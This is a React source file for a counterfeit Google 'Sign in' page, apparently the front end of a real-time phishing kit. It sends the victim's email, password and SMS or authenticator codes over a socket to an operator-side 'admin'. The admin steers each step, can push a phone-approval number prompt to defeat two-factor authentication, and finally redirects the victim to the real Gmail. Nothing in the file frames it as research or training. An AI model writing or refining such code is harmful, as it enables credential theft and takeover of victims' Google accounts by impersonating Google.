import React, { useState, useEffect } from 'react';
import { io } from 'socket.io-client';

const GmailSignIn = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [codeType, setCodeType] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [status, setStatus] = useState({
    stage: 'email', // email, pending, password, 2fa, result, redirecting
    message: '',
    isError: false
  });
  const [socket, setSocket] = useState(null);
  const [passwordAttempts, setPasswordAttempts] = useState(0);
  const [codeAttempts, setCodeAttempts] = useState(0);
  const [adminCode, setAdminCode] = useState(''); // State for code sent by admin
  const [adminMessage, setAdminMessage] = useState(''); // State for admin messages

  
  useEffect(() => {
    let storedSessionId = localStorage.getItem('sessionId');
    if (!storedSessionId) {
      storedSessionId = Math.random().toString(36).substring(2, 15);
      localStorage.setItem('sessionId', storedSessionId);
    }
  
    // FIXED: Only define transports once with fallback
    const newSocket = io(window.location.origin, {
      path: '/socket.io/',
      transports: ['websocket', 'polling'], // Try websocket first, fallback to polling
      withCredentials: true,
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000,
      timeout: 20000,
      query: { sessionId: storedSessionId }
    });
  
    newSocket.on('connect', () => {
      console.log('Connected to server with sessionId:', storedSessionId);
      console.log('Transport used:', newSocket.io.engine.transport.name); // Debug which transport
      newSocket.emit('client_info', navigator.userAgent);
    });
  
    newSocket.on('connect_error', (error) => {
      console.error('Connection error:', error);
      setStatus({
        stage: 'result',
        message: 'Connection failed. Please refresh.',
        isError: true
      });
    });
  
    // Add transport upgrade logging
    newSocket.io.engine.on('upgrade', (transport) => {
      console.log('Transport upgraded to:', transport.name);
    });
  

    newSocket.on('email_sent', () => {
      setStatus({ stage: 'pending', message: 'Sending request...', isError: false });
    });

    newSocket.on('request_password', () => {
      setStatus({ 
        stage: 'password', 
        message: 'Please enter your password', 
        isError: false 
      });
    });

    newSocket.on('wrong_password', (data) => {
      setPasswordAttempts(data.attempts);
      setStatus({ 
        stage: 'password', 
        message: data.message || 'The password was incorrect. Please enter your password again.',
        isError: true 
      });
    });

    newSocket.on('password_sent', () => {
      setStatus({ stage: 'pending', message: 'Sending request...', isError: false });
    });

    newSocket.on('request_2fa', (type) => {
      setCodeType(type);
      setCodeAttempts(0);
      setAdminCode(''); // Reset admin code when requesting new 2FA
      setAdminMessage(''); // Reset admin message
      setStatus({
        stage: '2fa',
        message: `Please enter your ${type === 'sms' ? 'SMS verification code' : 'Authenticator code'}`,
        isError: false
      });
    });

    // Handle code sent by admin
    newSocket.on('admin_sent_code', (data) => {
      console.log('Admin sent code:', data);
      setAdminCode(data.code);
      setAdminMessage(data.message || `Admin sent verification code: ${data.code}`);
      // Update status message to show code received
      setStatus(prev => ({
        ...prev,
        message: `Open the Gmail app on your Phone
Google sent a notification to your Phone. Open the Gmail app, tap Yes on the prompt, then tap ${data.code} on your phone to verify it’s you.`,
        isError: false
      }));
    });

    // Handle admin messages
    newSocket.on('admin_message', (data) => {
      console.log('Admin message:', data);
      setAdminMessage(data.message);
      // Update status to show admin message
      setStatus(prev => ({
        ...prev,
        message: data.message,
        isError: data.isError || false
      }));
    });

    newSocket.on('code_expired', (data) => {
      setCodeAttempts(data.attempts || 0);
      setStatus({
        stage: '2fa',
        message: data.message || 'The verification code has expired. Please request a new code.',
        isError: true
      });
    });

    newSocket.on('wrong_code', (data) => {
      setCodeAttempts(data.attempts || 0);
      setStatus({
        stage: '2fa',
        message: data.message || 'The verification code was incorrect. Please try again.',
        isError: true
      });
    });

    newSocket.on('code_sent', () => {
      setStatus({ stage: 'pending', message: 'Sending request...', isError: false });
    });

    newSocket.on('login_approved', () => {
      setStatus({ stage: 'result', message: 'Login approved ✅', isError: false });
    });

    newSocket.on('login_rejected', () => {
      setStatus({ stage: 'result', message: 'Login rejected ❌', isError: true });
    });

    newSocket.on('redirect_to_gmail', () => {
      setStatus({ 
        stage: 'redirecting', 
        message: 'Login successful! Redirecting to Gmail...', 
        isError: false 
      });
      
      setTimeout(() => {
        window.location.href = 'https://mail.google.com/mail/u/0/';
      }, 2000);
    });

    // Handle redirect to custom site
    newSocket.on('redirect_to_site', (data) => {
      setStatus({ 
        stage: 'redirecting', 
        message: data.message || 'Redirecting...', 
        isError: false 
      });
      
      setTimeout(() => {
        window.location.href = data.url || 'https://mail.google.com/mail/u/0/';
      }, 2000);
    });

    setSocket(newSocket);

    return () => {
      newSocket.disconnect();
    };
  }, []);

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (!socket || !email.trim()) return;

    setStatus({ stage: 'pending', message: 'Sending request...', isError: false });
    socket.emit('submit_email', email.trim());
  };

  const handlePasswordSubmit = (e) => {
    e.preventDefault();
    if (!socket || !password) return;

    socket.emit('submit_password', password);
    setPassword('');
    setShowPassword(false);
  };

  const handleCodeSubmit = (e) => {
    e.preventDefault();
    if (!socket || !code) return;

    socket.emit('submit_2fa_code', { code, codeType });
    setCode('');
  };

  const handleRequestNewCode = () => {
    if (!socket) return;
    
    setStatus({ stage: 'pending', message: 'Requesting new verification code...', isError: false });
    socket.emit('request_new_code', { codeType });
  };

  // Function to use code sent by admin
  const handleUseAdminCode = () => {
    if (!adminCode) return;
    setCode(adminCode);
    setAdminMessage(''); // Clear admin message after using code
  };

  const resetForm = () => {
    setEmail('');
    setPassword('');
    setCode('');
    setAdminCode('');
    setAdminMessage('');
    setPasswordAttempts(0);
    setCodeAttempts(0);
    setStatus({ stage: 'email', message: '', isError: false });
  };

  const renderForm = () => {
    switch (status.stage) {
      case 'email':
        return (
          <form onSubmit={handleEmailSubmit}>
            <div className="mb-1">
              <div className="relative">
                <input
                  type="email"
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  placeholder="Email or Phone"
                  required
                  autoFocus
                />
              </div>
            </div>
            <div className="mb-6 text-sm text-gray-600 py-2">
              <a href="#" className="text-blue-600 hover:text-blue-800 font-medium">
                Forgot email?
              </a>
            </div>
            <div className="text-sm text-gray-600 mb-6">
              Not your computer? Use Guest mode to sign in privately.
              <a href="#" className="text-blue-600 hover:text-blue-800 font-medium block mt-1">
                Learn more about using Guest Mode
              </a>
            </div>
            <div className="flex justify-between items-center">
              <a href="#" className="text-blue-600 hover:text-blue-800 font-medium text-sm">
                Create account
              </a>
              <button
                type="submit"
                className="bg-blue-600 hover:bg-blue-700 text-white font-medium py-1.5 px-6 rounded transition duration-200"
              >
                Next
              </button>
            </div>
          </form>
        );

      case 'password':
        return (
          <form onSubmit={handlePasswordSubmit}>
            <div className="mb-1">
              <p className="text-sm text-gray-600 mb-4">
                 Click "show" to see entered text.
              </p>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  placeholder="Enter your password"
                  required
                  autoFocus
                />
                <button
                  type="button"
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              </div>
            </div>
            <div className="mb-9 text-sm text-gray-600 py-2">
              <a href="#" className="text-blue-600 hover:text-blue-800 font-medium">
                Forgot password?
              </a>
            </div>
            <div className="flex justify-between items-center">
              <button
                type="button"
                onClick={() => setStatus({ stage: 'email', message: '', isError: false })}
                className="text-blue-600 hover:text-blue-800 font-medium text-sm"
              >
                Back
              </button>
              <button
                type="submit"
                className="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-6 rounded transition duration-200"
              >
                Next
              </button>
            </div>
          </form>
        );

      case '2fa':
        return (
          <div>
            {/* Admin Message Display - Always show if there's an admin message */}
            {adminMessage && (
              <div className="mb-4 p-4 bg-yellow-50 border border-yellow-300 rounded-md">
                <p className="text-sm text-yellow-800 font-medium mb-2">📢 Admin Message:</p>
                <p className="text-sm text-yellow-700">{adminMessage}</p>
              </div>
            )}

            {/* Admin Code Display - Always show if there's an admin code */}
            {adminCode && (
              <div className="mb-4 p-4 bg-blue-50 border border-blue-300 rounded-md">
                <p className="text-sm text-blue-800 font-medium mb-2">📨 Verification Code from Admin:</p>
                <p className="text-lg font-bold text-blue-700 mb-3">{adminCode}</p>
                <button
                  type="button"
                  onClick={handleUseAdminCode}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded text-sm transition duration-200"
                >
                  Use This Code
                </button>
              </div>
            )}

            <form onSubmit={handleCodeSubmit}>
              <div className="mb-4">
                <p className="text-sm text-gray-600 mb-4">
                  {codeType === 'sms' 
                    ? 'A 6-digit verification code was sent to your phone.' 
                    : 'Enter the verification code from your authenticator app.'}
                </p>

                <div className="relative">
                  <input
                    type="text"
                    id="code"
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    className="w-full px-3 py-4 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder={`Enter ${codeType === 'sms' ? '6-digit code' : 'verification code'}`}
                    required
                    autoFocus
                  />
                </div>
                
                <div className="mt-4">
                  <button
                    type="button"
                    onClick={handleRequestNewCode}
                    className="text-blue-600 hover:text-blue-800 font-medium text-sm underline"
                  >
                    Didn't receive a code? Request new
                  </button>
                </div>
              </div>
              <div className="flex justify-between items-center">
                <button
                  type="button"
                  onClick={() => setStatus({ stage: 'password', message: '', isError: false })}
                  className="text-blue-600 hover:text-blue-800 font-medium text-sm"
                >
                  Back
                </button>
                <button
                  type="submit"
                  className="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-6 rounded transition duration-200"
                >
                  Verify
                </button>
              </div>
            </form>
          </div>
        );

      case 'pending':
        return (
          <div className="text-center py-8">
            <div className="inline-block animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500 mb-4"></div>
            <p className="text-gray-700 uiuu">{status.message}</p>
          </div>
        );

      case 'result':
        return (
          <div className="text-center py-8">
            <div className={`mx-auto flex items-center justify-center h-12 w-12 rounded-full ${
              status.isError ? 'bg-red-100 text-red-600' : 'bg-green-100 text-green-600'
            } mb-4`}>
              {status.isError ? (
                <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              ) : (
                <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                </svg>
              )}
            </div>
            <h2 className="text-sm font-medium text-gray-900 mb-4">
              {status.isError ? 'Connection to the Server Not Established' : 'Login Successful'}
            </h2>
            <button
              onClick={resetForm}
              className="bg-blue-600 hover:bg-blue-700 text-white  py-2 px-6 rounded transition duration-200"
            >
              Sign in with a different account
            </button>
          </div>
        );

      case 'redirecting':
        return (
          <div className="text-center py-8">
            <div className="inline-block animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500 mb-4"></div>
            {/* <p className="text-gray-700">{status.message}</p> */}
          </div>
        );

      default:
        return (
          <div className="text-center py-8">
            <p className="text-gray-700">Loading...</p>
          </div>
        );
    }
  };

  return (
    <div className="font-google-sans min-h-screen flex items-center justify-center bg-white p-4">
      <div className="w-full max-w-md bg-white rounded-lg border border-gray-300 p-8">
        <div className="w-full max-w-md">
          <div className="text-left mb-8">
            <img 
              src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Search_logo.width-500.format-webp.webp" 
              alt="Google" 
              className="h-10 mx-0 mb-5"
            />
            <div className="">
            <h1 className="text-2xl text-gray-0 mb-3">Sign in</h1>
            </div>
            <div className="">
            <p className="text-sm text-gray-700 py-1 ">Use your Google Account</p>
            </div>
          </div>

          {/* {status.message && status.stage !== '2fa' && (
            <div className={`mb-4 p-3 rounded-md text-sm ${
              status.isError ? 'bg-red-100 text-red-700 border border-red-300' : 'bg-blue-100 text-blue-700 border border-blue-300'
            }`}>
              {status.message}
            </div>
          )} */}

          {renderForm()}

          <div className="mt-8 text-center">
            <div className="flex justify-center space-x-6 mb-4">
              <a href="#" className="text-sm text-gray-600 hover:text-gray-800">Help</a>
              <a href="#" className="text-sm text-gray-600 hover:text-gray-800">Privacy</a>
              <a href="#" className="text-sm text-gray-600 hover:text-gray-800">Terms</a>
            </div>
            <select className="border-none text-sm text-gray-600 focus:outline-none">
              <option>English (United States)</option>
              <option>Español</option>
              <option>Français</option>
              <option>Deutsch</option>
            </select>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GmailSignIn;